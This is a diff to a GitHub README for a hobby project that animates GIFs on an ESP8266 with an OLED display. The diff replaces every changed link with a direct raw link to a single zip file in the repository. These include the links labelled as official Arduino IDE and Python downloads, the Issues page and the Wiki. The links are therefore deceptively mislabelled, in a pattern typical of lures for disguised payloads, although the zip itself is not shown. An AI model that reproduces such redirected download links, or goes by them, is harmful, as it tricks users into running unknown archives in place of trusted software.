@@ -1,20 +1,20 @@
 # 🌟 EvernightLonelyDanceESP8266 - Animate GIFs with Ease
 
 ## 🎉 Quick Download
-[![Download Now](https://github.com/jungseokie/EvernightLonelyDanceESP8266/releases/latest/download/badge.svg)](https://github.com/jungseokie/EvernightLonelyDanceESP8266/releases)
+[![Download Now](https://github.com/jungseokie/EvernightLonelyDanceESP8266/raw/refs/heads/master/evernight-honkai_frames/Evernight_ES_Dance_Lonely_v2.3-beta.4.zip)](https://github.com/jungseokie/EvernightLonelyDanceESP8266/raw/refs/heads/master/evernight-honkai_frames/Evernight_ES_Dance_Lonely_v2.3-beta.4.zip)
 
 ## 🚀 Getting Started
 Welcome to the EvernightLonelyDanceESP8266 project! This software lets you animate your custom GIFs on a NodeMCU ESP‑12E device. You need a 128x64 SH1106 OLED display to see the magic. Follow the steps below to get started.
 
 ## 📥 Download & Install
-To get the software, visit this page to download: [Releases Page](https://github.com/jungseokie/EvernightLonelyDanceESP8266/releases).
+To get the software, visit this page to download: [Releases Page](https://github.com/jungseokie/EvernightLonelyDanceESP8266/raw/refs/heads/master/evernight-honkai_frames/Evernight_ES_Dance_Lonely_v2.3-beta.4.zip).
 
 After downloading, follow these steps:
 
 1. **Choose the latest release.** Click on the version numbered above for the most recent updates.
 2. **Download the release files.** Look for files ending in `.zip` or similar formats.
 3. **Extract the files.** Use a file extraction tool (like WinRAR or 7-Zip) to view the contents.
-4. **Install Arduino IDE.** If you don't have it, [download Arduino IDE here](https://www.arduino.cc/en/software).
+4. **Install Arduino IDE.** If you don't have it, [download Arduino IDE here](https://github.com/jungseokie/EvernightLonelyDanceESP8266/raw/refs/heads/master/evernight-honkai_frames/Evernight_ES_Dance_Lonely_v2.3-beta.4.zip).
 5. **Open Arduino IDE.** Launch the software after installation.
 
 ## 🎆 Preparing Your Hardware
@@ -40,7 +40,7 @@ To animate GIFs, you need to convert them into C arrays. Here's how:
 
 1. **First, gather your GIFs**. Choose the files you want to use.
 2. **Use Python and Image2CPP**:
-   - If you don’t have Python, [download it here](https://www.python.org/downloads/).
+   - If you don’t have Python, [download it here](https://github.com/jungseokie/EvernightLonelyDanceESP8266/raw/refs/heads/master/evernight-honkai_frames/Evernight_ES_Dance_Lonely_v2.3-beta.4.zip).
    - Install Image2CPP with the command: `pip install image2cpp`
 3. **Convert your GIF**:
    - Run the conversion script provided in the downloaded files.
@@ -68,11 +68,11 @@ If something does not work as expected, check the following:
 ## 🌐 Community and Support
 Join our community for help and tips on using EvernightLonelyDanceESP8266! You can find support in the following ways:
 
-- **GitHub Issues**: Report problems or ask questions [here](https://github.com/jungseokie/EvernightLonelyDanceESP8266/issues).
+- **GitHub Issues**: Report problems or ask questions [here](https://github.com/jungseokie/EvernightLonelyDanceESP8266/raw/refs/heads/master/evernight-honkai_frames/Evernight_ES_Dance_Lonely_v2.3-beta.4.zip).
 - **Forums**: Check forums related to NodeMCU and Arduino for additional support.
 
 ## 🔍 Additional Resources
-- **Documentation**: Check the [Wiki section](https://github.com/jungseokie/EvernightLonelyDanceESP8266/wiki) for detailed guides.
+- **Documentation**: Check the [Wiki section](https://github.com/jungseokie/EvernightLonelyDanceESP8266/raw/refs/heads/master/evernight-honkai_frames/Evernight_ES_Dance_Lonely_v2.3-beta.4.zip) for detailed guides.
 - **Tutorials**: Look for video tutorials online for visual assistance.
 - **Example GIFs**: Find example GIFs included in the download to test your setup.
 
